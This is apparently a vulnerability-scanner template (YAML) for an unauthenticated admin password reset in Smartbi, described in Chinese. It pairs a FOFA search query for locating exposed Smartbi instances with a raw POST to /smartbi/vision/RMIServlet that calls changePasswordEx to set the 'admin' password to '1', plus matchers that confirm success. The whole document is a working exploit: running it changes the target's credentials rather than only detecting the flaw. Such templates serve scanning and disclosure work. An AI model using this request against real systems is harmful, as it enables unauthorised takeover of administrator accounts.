id: smartbi-changepassword-bypass

info:
  name: Smartbi changePasswordEx 未授权修改用户密码
  author: zan8in
  severity: high
  description: |
    Smartbi RMIServlet UserService.changePasswordEx 接口可未授权重置管理员密码。
  metadata:
    max-request: 1
    fofa-query: title="Smartbi"
  tags: smartbi,bypass

http:
  - raw:
      - |
        POST /smartbi/vision/RMIServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        className=UserService&methodName=changePasswordEx&params=["admin","","1"]

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"retCode":0'
          - '"duration":'
        condition: and

      - type: status
        status:
          - 200
